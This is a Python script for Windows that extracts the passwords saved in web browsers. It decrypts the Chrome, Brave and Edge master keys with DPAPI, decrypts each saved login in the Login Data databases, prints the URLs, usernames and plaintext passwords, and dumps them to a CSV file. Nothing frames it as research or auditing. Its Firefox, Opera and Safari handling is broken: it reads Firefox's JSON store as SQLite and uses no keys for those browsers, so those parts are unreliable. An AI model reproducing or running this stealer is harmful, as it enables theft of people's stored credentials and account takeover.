import os
import re
import json
import base64
import sqlite3
import csv
import win32crypt
from Cryptodome.Cipher import AES

# GLOBAL CONSTANTS
# Define paths for different browsers and their local state files
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
BRAVE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State" % (os.environ['USERPROFILE']))
EDGE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State" % (os.environ['USERPROFILE']))
FIREFOX_PATH = os.path.normpath(r"%s\AppData\Roaming\Mozilla\Firefox\Profiles" % (os.environ['USERPROFILE']))
OPERA_PATH = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable" % (os.environ['USERPROFILE']))
SAFARI_PATH = os.path.normpath(r"%s\AppData\Local\Apple Computer\Safari" % (os.environ['USERPROFILE']))

CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
BRAVE_PATH = os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data" % (os.environ['USERPROFILE']))
EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data" % (os.environ['USERPROFILE']))
OPERA_PATH = os.path.normpath(r"%s" % OPERA_PATH)
SAFARI_PATH = os.path.normpath(r"%s" % SAFARI_PATH)

def get_secret_key(local_state_path):
    try:
        # Read and decode the secret key from the local state file
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"Error: {str(e)}")
        print("[ERR] Secret key cannot be found")
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        # Decrypt the password using AES encryption
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password).decode()
        return decrypted_pass
    except Exception as e:
        print(f"Error: {str(e)}")
        print("[ERR] Unable to decrypt password")
        return ""

def get_db_connection(login_db_path):
    try:
        # Establish a connection to the browser's login database
        return sqlite3.connect(login_db_path)
    except Exception as e:
        print(f"Error: {str(e)}")
        print("[ERR] Database cannot be found")
        return None

def run():
    try:
        # Open a CSV file to write decrypted passwords
        with open('decrypted_passwords.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["browser", "index", "url", "username", "password"])

            # List of browsers to retrieve passwords from
            browsers = [
                {"name": "Chrome", "path": CHROME_PATH, "local_state_path": CHROME_PATH_LOCAL_STATE},
                {"name": "Brave", "path": BRAVE_PATH, "local_state_path": BRAVE_PATH_LOCAL_STATE},
                {"name": "Edge", "path": EDGE_PATH, "local_state_path": EDGE_PATH_LOCAL_STATE},
                {"name": "Firefox", "path": FIREFOX_PATH, "local_state_path": None},
                {"name": "Opera", "path": OPERA_PATH, "local_state_path": None},
                {"name": "Safari", "path": SAFARI_PATH, "local_state_path": None}
            ]

            # Iterate through each browser
            for browser in browsers:
                try:
                    # Check if the current browser is Firefox
                    if browser['name'] == 'Firefox':
                        profiles = [profile for profile in os.listdir(browser['path']) if os.path.isdir(os.path.join(browser['path'], profile))]
                        for profile in profiles:
                            # Construct the path to the Firefox login database
                            login_db_path = os.path.normpath(r"%s\%s\logins.json" % (os.path.join(browser['path'], profile), "logins.json"))
                            conn = get_db_connection(login_db_path)
                            if conn:
                                cursor = conn.cursor()
                                cursor.execute("SELECT hostname, usernameValue, password_value FROM moz_logins")
                                for index, login in enumerate(cursor.fetchall()):
                                    url = login[0]
                                    username = login[1]
                                    ciphertext = base64.b64decode(login[2])
                                    if url and username and ciphertext:
                                        decrypted_passwords = decrypt_password(ciphertext, None)
                                        print(f"Browser: {browser['name']}")
                                        print(f"Sequence: {index}")
                                        print(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_passwords}\n")
                                        print("_" * 70)
                                        csv_writer.writerow([browser['name'], index, url, username, decrypted_passwords])
                                cursor.close()
                                conn.close()
                    else:
                        # For other browsers (Chrome, Brave, Edge, Opera, Safari)
                        folders = [element for element in os.listdir(browser['path']) if re.search("^Profile*|^Default$", element) != None]
                        for folder in folders:
                            # Construct the path to the login database
                            login_db_path = os.path.normpath(r"%s\%s\Login Data" % (browser['path'], folder))
                            conn = get_db_connection(login_db_path)
                            if conn:
                                secret_key = get_secret_key(browser['local_state_path'])
                                cursor = conn.cursor()
                                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                                for index, login in enumerate(cursor.fetchall()):
                                    url = login[0]
                                    username = login[1]
                                    ciphertext = login[2]
                                    if url != "" and username != "" and ciphertext != "":
                                        decrypted_passwords = decrypt_password(ciphertext, secret_key)
                                        print(f"Browser: {browser['name']}")
                                        print(f"Sequence: {index}")
                                        print(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_passwords}\n")
                                        print("_" * 70)
                                        csv_writer.writerow([browser['name'], index, url, username, decrypted_passwords])
                                cursor.close()
                                conn.close()
                except Exception as e:
                    print(f"Error: {str(e)}")
                    print(f"[ERR] An error occurred for {browser['name']}")

    except Exception as e:
        print(f"Error: {str(e)}")
        print("[ERR] An error occurred")
